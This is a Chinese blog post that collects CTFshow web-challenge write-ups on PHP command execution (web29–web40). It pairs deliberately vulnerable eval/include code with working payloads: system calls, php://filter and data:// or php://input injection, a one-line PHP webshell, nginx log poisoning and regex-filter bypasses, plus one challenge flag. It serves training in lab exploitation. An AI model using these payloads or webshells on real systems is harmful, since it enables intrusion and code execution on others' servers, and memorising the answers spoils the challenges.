<!DOCTYPE html>
<html lang="en">
    <!-- title -->
<!-- keywords -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="温柔刀">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="温柔刀">
        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
    <meta name="description" content="">
    <meta name="description" content="本文是网上题解的结合，并非本人所写，偶尔会有一点感想。 WEB 入门信息搜集web1-17爆破web18-23命令执行web29(有没懂的知识)123456789if(isset($_GET[&#x27;c&#x27;]))&#123;    $c &#x3D; $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;">
<meta property="og:type" content="article">
<meta property="og:title" content="CTFSHOW 刷题汇总">
<meta property="og:url" content="http://example.com/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/index.html">
<meta property="og:site_name" content="三重门">
<meta property="og:description" content="本文是网上题解的结合，并非本人所写，偶尔会有一点感想。 WEB 入门信息搜集web1-17爆破web18-23命令执行web29(有没懂的知识)123456789if(isset($_GET[&#x27;c&#x27;]))&#123;    $c &#x3D; $_GET[&#x27;c&#x27;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/QQ20250510-091241.png">
<meta property="og:image" content="http://example.com/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/QQ20250510-144822.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1756979530074-d60b7de2-247a-446a-ab78-e0fd334a36dd.png?x-oss-process=image/format,webp">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1757149241016-0a90b84f-d299-404a-9e9b-01c828e4756a.png?x-oss-process=image/format,webp">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1757149265381-78905287-f98c-4693-bc84-7bfb7827d9fc.png?x-oss-process=image/format,webp">
<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/c81f856502a1c54aa271b34db25adc27.png">
<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/e3966a01130c32c077efb2c821824996.png">
<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/4239067b7d7f048781688e46da4be0ec.png">
<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/b9e001099149888669046078e78158e2.png">
<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/7014bddcae9748ce09744dcb89cb8da6.png">
<meta property="og:image" content="http://example.com/AppData/Roaming/Typora/typora-user-images/image-20250824183428529.png">
<meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250813223720736.png">
<meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250813224859620.png">
<meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250813232421761.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1756895243450-b7deaadb-4900-4839-9748-31203a663bf0.png?x-oss-process=image/format,webp">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1756957245440-c6e69c8a-fc3a-4e14-a2e1-44fecc21dd03.png?x-oss-process=image/format,webp">
<meta property="article:published_time" content="2025-03-26T11:01:01.000Z">
<meta property="article:modified_time" content="2025-09-08T02:51:36.915Z">
<meta property="article:author" content="温柔刀">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/QQ20250510-091241.png">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="icon" href="/assets/favicon.ico">
    <title>CTFSHOW 刷题汇总 · Gentle_knife&#39;s Studio</title>
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
    (function (w) {
        'use strict'
        // rel=preload support test
        if (!w.loadCSS) {
            w.loadCSS = function () {}
        }
        // define on the loadCSS obj
        var rp = (loadCSS.relpreload = {})
        // rel=preload feature support test
        // runs once and returns a function for compat purposes
        rp.support = (function () {
            var ret
            try {
                ret = w.document.createElement('link').relList.supports('preload')
            } catch (e) {
                ret = false
            }
            return function () {
                return ret
            }
        })()

        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
        // then change that media back to its intended value on load
        rp.bindMediaToggle = function (link) {
            // remember existing media attr for ultimate state, or default to 'all'
            var finalMedia = link.media || 'all'

            function enableStylesheet() {
                link.media = finalMedia
            }

            // bind load handlers to enable media
            if (link.addEventListener) {
                link.addEventListener('load', enableStylesheet)
            } else if (link.attachEvent) {
                link.attachEvent('onload', enableStylesheet)
            }

            // Set rel and non-applicable media type to start an async request
            // note: timeout allows this to happen async to let rendering continue in IE
            setTimeout(function () {
                link.rel = 'stylesheet'
                link.media = 'only x'
            })
            // also enable media after 3 seconds,
            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
            setTimeout(enableStylesheet, 3000)
        }

        // loop through link elements in DOM
        rp.poly = function () {
            // double check this to prevent external calls from running
            if (rp.support()) {
                return
            }
            var links = w.document.getElementsByTagName('link')
            for (var i = 0; i < links.length; i++) {
                var link = links[i]
                // qualify links to those with rel=preload and as=style attrs
                if (
                    link.rel === 'preload' &&
                    link.getAttribute('as') === 'style' &&
                    !link.getAttribute('data-loadcss')
                ) {
                    // prevent rerunning on link
                    link.setAttribute('data-loadcss', true)
                    // bind listeners to toggle media back
                    rp.bindMediaToggle(link)
                }
            }
        }

        // if unsupported, run the polyfill
        if (!rp.support()) {
            // run once at least
            rp.poly()

            // rerun poly on an interval until onload
            var run = w.setInterval(rp.poly, 500)
            if (w.addEventListener) {
                w.addEventListener('load', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            } else if (w.attachEvent) {
                w.attachEvent('onload', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            }
        }

        // commonjs
        if (typeof exports !== 'undefined') {
            exports.loadCSS = loadCSS
        } else {
            w.loadCSS = loadCSS
        }
    })(typeof global !== 'undefined' ? global : this)
</script>

    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .footer-fixed-btn,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(
            -45deg,
            #444 0,
            #444 80px,
            #333 80px,
            #333 160px
        );
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }
</style>

    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js" as="script">
    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
    <!-- algolia -->
    <!-- 百度统计  -->
    <!-- 谷歌统计  -->
    <!-- Google tag (gtag.js) -->
<meta name="generator" content="Hexo 7.3.0"></head>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ == undefined) {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js" />')
        }
    </script>
        <body class="post-body">
        <!-- header -->
        <header class="header header-mobile">
    <!-- top read progress line -->
    <div class="header-element">
        <div class="read-progress"></div>
    </div>
    <!-- sidebar menu button -->
    <div class="header-element">
        <div class="header-sidebar-menu">
            <div style="padding-left: 1px;">&#xe775;</div>
        </div>
    </div>
    <!-- header actions -->
    <div class="header-actions">
        <!-- theme mode switch button -->
        <span class="header-theme-btn header-element">
            <i class="fas fa-adjust"></i>
        </span>
        <!-- back to home page text -->
        <span class="home-link header-element">
            <a href="/">Gentle_knife's Studio.</a>
        </span>
    </div>
    <!-- toggle banner -->
    <div class="banner">
        <div class="blog-title header-element">
            <a href="/">Gentle_knife&#39;s Studio.</a>
        </div>
        <div class="post-title header-element">
            <a href="#" class="post-name">CTFSHOW 刷题汇总</a>
        </div>
    </div>
</header>

        <!-- fixed footer -->
        <footer class="footer-fixed">
    <!-- donate button -->

    <!-- back to top button -->
    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
        <div>&#xe639;</div>
    </div>
</footer>

        <!-- wrapper -->
        <div class="wrapper">
            <div class="site-intro" style="    height:50vh;
">
    <!-- 主页  -->
    <!-- 404页  -->
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
                CTFSHOW 刷题汇总
            <!-- 404 -->
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            <!-- 404 -->
        </p>
        <!-- 文章页 meta -->
            <div class="post-intros">
                <!-- 文章页标签  -->
                    <div class="post-intro-tags" >
        <a class="post-tag" href="javascript:void(0);" data-tags="wp">wp</a>
</div>

                <!-- 文章字数统计 -->
                    <div class="post-intro-read">
                        <span>Word count: <span class="post-count word-count">11.6k</span>Reading time: <span class="post-count reading-time">54 min</span></span>
                    </div>
                <div class="post-intro-meta">
                    <!-- 撰写日期 -->
                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
                    <span class="post-intro-time">2025/03/26</span>
                    <!-- busuanzi -->
                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    <!-- 文章分享 -->
                    <span class="share-wrapper">
                        <span class="iconfont-archer share-icon">&#xe71d;</span>
                        <span class="share-text">Share</span>
                        <ul class="share-list">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
    </div>
</div>

            <script>
  // get user agent
  function getBrowserVersions() {
    var u = window.navigator.userAgent
    return {
      userAgent: u,
      trident: u.indexOf('Trident') > -1, //IE内核
      presto: u.indexOf('Presto') > -1, //opera内核
      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
      iPad: u.indexOf('iPad') > -1, //是否为iPad
      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
    }
  }
  var browser = {
    versions: getBrowserVersions(),
  }
  console.log('userAgent: ' + browser.versions.userAgent)

  // callback
  function fontLoaded() {
    console.log('font loaded')
    if (document.getElementsByClassName('site-intro-meta')) {
      document
        .getElementsByClassName('intro-title')[0]
        .classList.add('intro-fade-in')
      document
        .getElementsByClassName('intro-subtitle')[0]
        .classList.add('intro-fade-in')
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in')
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb() {
    if (browser.versions.uc) {
      console.log('UCBrowser')
      fontLoaded()
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular'],
        },
        loading: function () {
          // 所有字体开始加载
          // console.log('font loading');
        },
        active: function () {
          // 所有字体已渲染
          fontLoaded()
        },
        inactive: function () {
          // 字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout')
          fontLoaded()
        },
        timeout: 5000, // Set the timeout to two seconds
      })
    }
  }

  function asyncErr() {
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0]
    o.src = u
    if (cb) {
      o.addEventListener(
        'load',
        function (e) {
          cb(null, e)
        },
        false
      )
    }
    if (err) {
      o.addEventListener(
        'error',
        function (e) {
          err(null, e)
        },
        false
      )
    }
    s.parentNode.insertBefore(o, s)
  }

  var asyncLoadWithFallBack = function (arr, success, reject) {
    var currReject = function () {
      reject()
      arr.shift()
      if (arr.length) async(arr[0], success, currReject)
    }

    async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack(
    [
      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
      "/lib/webfontloader.min.js",
    ],
    asyncCb,
    asyncErr
  )
</script>

            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
            <div class="container container-unloaded">
                <main class="main post-page">
    <article class="article-entry">
        <meta name="referrer" content="no-referrer" />

<p>本文是网上题解的结合，并非本人所写，偶尔会有一点感想。</p>
<h1 id="WEB-入门"><a href="#WEB-入门" class="headerlink" title="WEB 入门"></a>WEB 入门</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="web1-17"><a href="#web1-17" class="headerlink" title="web1-17"></a>web1-17</h3><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="web18-23"><a href="#web18-23" class="headerlink" title="web18-23"></a>web18-23</h3><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="web29-有没懂的知识"><a href="#web29-有没懂的知识" class="headerlink" title="web29(有没懂的知识)"></a>web29(有没懂的知识)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>eval 是 PHP 里的一个内置函数，它的作用是把字符串当作 PHP 代码来执行。<br><code>?c=system(&quot;cat f*&quot;);</code></p>
<blockquote>
<h3 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h3><p>拿到题目，可以看到通过 eval 函数可以执行 php 代码或者系统命令，其中过滤了 flag。</p>
<p><code>$_GET[c]</code>的意思是我们输入 c 参数； pregmatch 是正则匹配是否包含 flag，<code>if(!preg_match(&quot;/flag/i&quot;, $c))</code>，&#x2F;i 忽略大小写，如果输入参数中不包含 flag 的大小写，则进入 if 判断内部。 还有&#x2F;m 等参数表示多行匹配，具体可以参考这里：<a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-354831.html">https://www.php.cn/php-weizijiaocheng-354831.html</a></p>
<p><code> eval($c)</code>;就是本题的漏洞点 ，这个之前的输入过滤太简单了。eval 内执行的是 php 代码，必须以分号结尾。eval 和其他函数的对比可以参考这里：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/109231480">https://blog.csdn.net/weixin_39934520/article/details/109231480</a></p>
<h3 id="分别以如下方法尝试拿到-flag"><a href="#分别以如下方法尝试拿到-flag" class="headerlink" title="分别以如下方法尝试拿到 flag:"></a>分别以如下方法尝试拿到 flag:</h3><h4 id="1、直接执行系统命令"><a href="#1、直接执行系统命令" class="headerlink" title="1、直接执行系统命令"></a>1、直接执行系统命令</h4><p><code>?c=system(&quot;tac%20fla*&quot;); </code>利用 tac 与 system 结合，拿到 flag</p>
<p>因为可以利用 system 来间接执行系统命令，如果 flag 不在当前目录，也可以利用<code>?c=system(&quot;ls&quot;);</code> 来查看到底在哪里。</p>
<h4 id="2、内敛执行-（反字节符）"><a href="#2、内敛执行-（反字节符）" class="headerlink" title="2、内敛执行 （反字节符）"></a>2、内敛执行 （反字节符）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">注意结尾的分号，注意写 writeup 时，因为有反字节符，要核对一下是否转义，需要再在页面上确认一下。 利用 echo 命令和 tac 相结合来实现。注意 flag 采用*绕过，\`反字节符，是键盘左上角与~在一起的那个。</span><br><span class="line"></span><br><span class="line">#### 3、利用参数输入+eval</span><br><span class="line"></span><br><span class="line">`?c=eval($_GET[1]);&amp;1=phpinfo();`</span><br><span class="line">试一下，没问题，可以看到 phpinfo 的信息。 然后就使用`?c=eval($_GET[1]);&amp;1=system(ls);`看一下当前目录都有什么，也可以`?c=eval($_GET[1]);&amp;1=system(&quot;ls%20/&quot;);`看一下根目录都有什么。 注意上一行结尾的分号都不能省略。因为是以 php 代码形式来执行的，所以结尾必须有分号。此外查看根目录时，必须用引号包裹，不太清楚原因，目前觉得因为 system 的参数必须是 string。</span><br><span class="line"></span><br><span class="line">#### 4、利用参数输入+include</span><br><span class="line"></span><br><span class="line">这里的 eval 也可以换为 include，并且可以不用括号。但是仅仅可以用来读文件了。</span><br><span class="line">`?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php`</span><br><span class="line">（参考 y4tacker 师傅的解法：https://blog.csdn.net/solitudi/article/details/109837640）</span><br><span class="line"></span><br><span class="line">也可以尝试写入木马 `file_put_contents(&quot;alb34t.php&quot;,%20%27&lt;?php%20eval($_POST[&quot;cmd&quot;]);%20?&gt;%27);` 访问 alb34t.php，然后就可以连马。</span><br><span class="line"></span><br><span class="line">#### 5、利用 cp 命令将 flag 拷贝到别处</span><br><span class="line"></span><br><span class="line">?c=system(&quot;cp%20fl*g.php%20a.txt%20&quot;);</span><br><span class="line">然后浏览器访问 a.txt，读取即可。</span><br><span class="line"></span><br><span class="line">### web30</span><br><span class="line">```php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">   $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">   if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">       eval($c);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></blockquote>
<p><code>?c=eval($_GET[1]);&amp;1=system(&quot;tac fla*&quot;);</code></p>
<h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;</span><br></pre></td></tr></table></figure>

<p><code>?c=eval($_GET[1]);&amp;1=system(&quot;tac fla*&quot;);</code></p>
<h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;, $c))&#123;</span><br></pre></td></tr></table></figure>

<p><code>?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
<h3 id="web33-（未复现）"><a href="#web33-（未复现）" class="headerlink" title="web33 （未复现）"></a>web33 （未复现）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;, $c))&#123;</span><br></pre></td></tr></table></figure>

<p>与前一关相比，貌似就多过滤了双引号号，所以上一关 payload 依然适用</p>
<p>php 中不需要括号的函数，如：<br><code>echo 123; print 123; die; include &quot;/etc/passwd&quot;; require &quot;/etc/passwd&quot;; include_once &quot;/etc/passwd&quot;; require_once &quot;etc/passwd&quot;;</code><br>这里我们利用<strong>include</strong>构造 payload</p>
<p><code>url/?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p>
<p>其中?&gt;代替分号，页面会显示 flag.php 内容的 base64 编码，解码即可获取 flag</p>
<p>还有一种方法，日志注入<br>url&#x2F;?c&#x3D;include$_GET[1]?%3E&amp;1&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 是 nginx 默认的 access 日志路径，访问该路径时，在 User-Agent 中写入一句话木马，然后用中国蚁剑连接即可</p>
<p><code>?c=include$_GET[1]?&gt;&amp;1=data://text/plain</code></p>
<h3 id="web34（未复现）"><a href="#web34（未复现）" class="headerlink" title="web34（未复现）"></a>web34（未复现）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;, $c))&#123;</span><br></pre></td></tr></table></figure>

<p>上面的 data 和 php 协议不能用了</p>
<h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><p><img src="/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/QQ20250510-091241.png" alt="QQ20250510-091241"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">题目对常见命令都进行过滤, 但是仔细发现可以利用 include 进行绕过, 具体实现方式为 eval(include flag.php;); ,但是题目屏蔽了分号(;)和点号(.), 其中分号可以使用?&gt;平替,但是点号无法绕过, 遂使用 post 执行 php 代码注入 flag.php, 因此可得 payload:</span><br><span class="line"></span><br><span class="line">GET：?c=include$_GET[1]?&gt;&amp;1=php://input</span><br><span class="line"></span><br><span class="line">POST：&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">需要注意,因为 POST 没有按照 key=value 封装数据, 因此 hackBar 认为数据有问题, 不会发送数据, 可以使用 Burp Suite 发送数据</span><br><span class="line"></span><br><span class="line">补充: php://input 默认读取没有处理过的 POST 数据</span><br></pre></td></tr></table></figure>

<h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;, $c))&#123;</span><br></pre></td></tr></table></figure>

<p><img src="/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/QQ20250510-144822.png" alt="QQ20250510-144822"></p>
<p><code>?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</code></p>
<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>从 eval 变成 include</p>
<blockquote>
<p>单独的 ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain 并没有任何实际执行或展示数据的功能，它只是表达了数据传递的方式，需要后续指定数据内容，比如 ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Hello%20World 就是传递纯文本 “Hello World”。</p>
</blockquote>
<p><code>?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</code></p>
<p><code>?c=data://text/plain,&lt;?=system(&quot;tac fla*&quot;)?&gt;</code></p>
<p>web38,39</p>
<h3 id="web40-未"><a href="#web40-未" class="headerlink" title="web40(未)"></a>web40(未)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">       <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>题解，查看当前工作目录 getcwd()，扫描当前目录及文件”scandir()”输出 为数组，flag.php 在倒数第二个个位置那就数组倒置 array_revers()，变为正数第二，在使用 next()函数指向从第一个指向第二个（及指向 flag.php）,最后使用 show_source（）查看文件的内容 ?c&#x3D;print_r(show_source(next(array_reverse(scandir(getcwd())))));</p>
<p>url+?c&#x3D;print_r(getcwd()); &#x3D;&#x3D;&#x3D;&gt; &#x2F;var&#x2F;www&#x2F;html</p>
<p>url+?c&#x3D;print_r(scandir(getcwd())); &#x3D;&#x3D;&#x3D;&gt; Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; flag.php [3] &#x3D;&gt; index.php )</p>
<p>url+?c&#x3D;print_r(array_reverse(scandir(getcwd()))); &#x3D;&#x3D;&gt; Array ( [0] &#x3D;&gt; index.php [1] &#x3D;&gt; flag.php [2] &#x3D;&gt; .. [3] &#x3D;&gt; . )</p>
<p>url+?c&#x3D;print_r(next(array_reverse(scandir(getcwd())))); &#x3D;&#x3D;&gt; flag.php</p>
<p>url+?c&#x3D;print_r(show_source(next(array_reverse(scandir(getcwd()))))); &#x3D;&#x3D;&gt; $flag&#x3D;”ctfshow{eca2e7df-d196-4b71-9632-ad4d32e194d3}”;</p>
</blockquote>
<blockquote>
<p>法一</p>
<p>c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;需要 POST 传入参数为 1&#x3D;system(‘tac fl*’);</p>
<p>get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如 GET、POST、FILE 等等。</p>
<p>next()将内部指针指向数组中的下一个元素，并输出。</p>
<p>array_pop() 函数删除数组中的最后一个元素并返回其值。</p>
